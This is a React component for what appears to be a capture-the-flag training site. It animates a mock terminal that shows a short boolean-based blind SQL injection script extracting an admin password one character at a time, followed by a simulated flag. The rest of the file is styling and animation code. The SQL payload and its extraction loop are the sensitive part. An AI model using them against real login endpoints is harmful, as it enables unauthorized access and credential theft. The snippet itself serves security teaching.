"use client";

import React, { useState, useEffect } from "react";

const LINES: { type: "cmd" | "comment" | "code" | "out"; raw: string }[] = [
  { type: "cmd", raw: "$ cd ~/ctf/web-101 && cat exploit.py" },
  { type: "comment", raw: "# Boolean-based blind SQLi - extract admin pwd" },
  { type: "code", raw: "import requests" },
  { type: "code", raw: "def leak(i, c):" },
  { type: "code", raw: '    payload = f"\' OR ASCII(SUBSTR(p,{i},1))={c}-- "' },
  { type: "code", raw: '    return "Welcome" in requests.post(URL, payload).text' },
  { type: "code", raw: 'flag = ""' },
  { type: "code", raw: "for i in range(1, 33):" },
  { type: "code", raw: "    for c in range(32, 127):" },
  { type: "code", raw: "        if leak(i, c): flag += chr(c)" },
  { type: "cmd", raw: "$ python exploit.py" },
  { type: "out", raw: "[+] leaked: CTF{bl1nd_sql_w1ns}" },
];

function colorize(type: string, raw: string): React.ReactNode {
  if (type === "cmd") {
    const parts = raw.split(" ");
    return (
      <>
        <span style={{ color: "#0AFFD4" }}>{parts[0]}</span> {parts.slice(1).join(" ")}
      </>
    );
  }
  if (type === "comment") {
    return <span style={{ color: "#7F7BA9" }}>{raw}</span>;
  }
  if (type === "out") {
    const m = /^(\[.\])\s(.+:\s)(.+)$/.exec(raw);
    if (m) {
      return (
        <>
          <span style={{ color: "#0AFFD4" }}>{m[1]}</span> {m[2]}
          <span style={{ color: "#FFB020" }}>{m[3]}</span>
        </>
      );
    }
    return raw;
  }
  // code - basic keyword highlighting
  return raw
    .split(/(import|def|return|for|if|in|range|chr)\b|(".*?")|(\d+(?:\.\d+)?)/)
    .map((seg, i) => {
      if (!seg) return null;
      if (/^(import|def|return|for|if|in|range|chr)$/.test(seg))
        return (
          <span key={i} style={{ color: "#4D8BFF" }}>
            {seg}
          </span>
        );
      if (/^".*"$/.test(seg) || seg.startsWith('f"'))
        return (
          <span key={i} style={{ color: "#0AFFD4" }}>
            {seg}
          </span>
        );
      if (/^\d+$/.test(seg))
        return (
          <span key={i} style={{ color: "#FFB020" }}>
            {seg}
          </span>
        );
      return <span key={i}>{seg}</span>;
    });
}

export function LandingTerminal(): React.ReactElement {
  const [visibleCount, setVisibleCount] = useState(0);
  const [done, setDone] = useState(false);

  useEffect(() => {
    if (done) {
      const t = setTimeout(() => {
        setVisibleCount(0);
        setDone(false);
      }, 4000);
      return () => {
        clearTimeout(t);
      };
    }
    if (visibleCount >= LINES.length) {
      setDone(true);
      return;
    }
    const line = LINES[visibleCount];
    const delay = line?.type === "cmd" ? 600 : 280;
    const t = setTimeout(() => {
      setVisibleCount((c) => c + 1);
    }, delay);
    return () => {
      clearTimeout(t);
    };
  }, [visibleCount, done]);

  return (
    <div
      style={{
        background: "#05041A",
        border: "1px solid #1F1B47",
        overflow: "hidden",
        boxShadow:
          "0 0 0 1px #2A2560, 0 32px 64px rgba(0,36,255,0.15), 0 0 80px rgba(10,255,212,0.06)",
        fontFamily: "var(--font-mono)",
      }}
    >
      {/* Title bar */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: 8,
          padding: "12px 16px",
          borderBottom: "1px solid #1F1B47",
          background: "#07062A",
        }}
      >
        <span style={{ width: 10, height: 10, borderRadius: "50%", background: "#FF4757" }} />
        <span style={{ width: 10, height: 10, borderRadius: "50%", background: "#FFB020" }} />
        <span style={{ width: 10, height: 10, borderRadius: "50%", background: "#0AFFD4" }} />
        <span
          style={{
            marginLeft: 12,
            fontFamily: "var(--font-mono)",
            fontSize: 11,
            color: "#7F7BA9",
            letterSpacing: "0.08em",
          }}
        >
          ~/<b style={{ color: "#B8B5D1" }}>ctf/web-101</b> · sandbox
        </span>
        <span
          style={{
            marginLeft: "auto",
            fontFamily: "var(--font-mono)",
            fontWeight: 700,
            fontSize: 9,
            letterSpacing: "0.18em",
            textTransform: "uppercase",
            color: "#030219",
            background: "#0AFFD4",
            padding: "3px 8px",
          }}
        >
          LIVE
        </span>
      </div>

      {/* Terminal body */}
      <div
        style={{
          padding: "16px 20px 20px",
          fontSize: 13,
          lineHeight: 1.65,
          color: "#B8B5D1",
          minHeight: 260,
          // Let long `white-space: pre` code lines scroll inside the box on
          // narrow phones instead of being clipped by the outer overflow:hidden.
          overflowX: "auto",
        }}
      >
        {LINES.slice(0, visibleCount).map((line, i) => (
          <div
            key={i}
            style={{
              fontFamily: "var(--font-mono)",
              fontSize: 13,
              lineHeight: 1.65,
              whiteSpace: "pre",
            }}
          >
            {colorize(line.type, line.raw)}
            {i === visibleCount - 1 && !done && (
              <span
                style={{
                  display: "inline-block",
                  width: 7,
                  height: 13,
                  background: "#0AFFD4",
                  boxShadow: "0 0 8px #0AFFD4",
                  verticalAlign: "-2px",
                  marginLeft: 2,
                  animation: "blink 1s step-end infinite",
                }}
              />
            )}
          </div>
        ))}

        {done && (
          <div
            style={{
              marginTop: 8,
              display: "inline-flex",
              alignItems: "center",
              gap: 14,
              fontFamily: "var(--font-mono)",
              fontWeight: 700,
              fontSize: 12,
              letterSpacing: "0.14em",
              color: "#030219",
              background: "#0AFFD4",
              padding: "8px 16px",
              boxShadow: "0 0 24px rgba(10,255,212,0.6)",
            }}
          >
            ● ACCESS GRANTED
            <span
              style={{
                fontFamily: "var(--font-mono)",
                fontWeight: 400,
                fontSize: 10,
                color: "#0A3028",
                letterSpacing: "0.06em",
              }}
            >
              +240 XP · 02:14
            </span>
          </div>
        )}
      </div>
    </div>
  );
}
